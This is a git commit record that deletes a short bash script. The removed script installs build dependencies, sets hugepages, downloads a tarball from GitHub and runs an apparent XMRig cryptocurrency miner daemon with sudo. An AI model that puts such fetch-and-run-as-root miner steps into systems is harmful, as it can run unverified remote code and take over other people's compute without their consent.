2e0ec4a4541998249717dd841af89b2303054cc8
phungkhanh90 <47034487+phungkhanh90@users.noreply.github.com>
2020-06-15 17:36:43 +0700

    Delete anhhoc.sh

--- anhhoc.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-apt-get update && 
-apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
-sudo sysctl vm.nr_hugepages=128 &&
-sudo sysctl -w vm.nr_hugepages=128 && wget https://github.com/phungkhanh90/dao/raw/master/ahoc.tar.gz && tar xf ahoc.tar.gz && cd ahoc && ls -la && 
-sudo ./xmrigDaemon
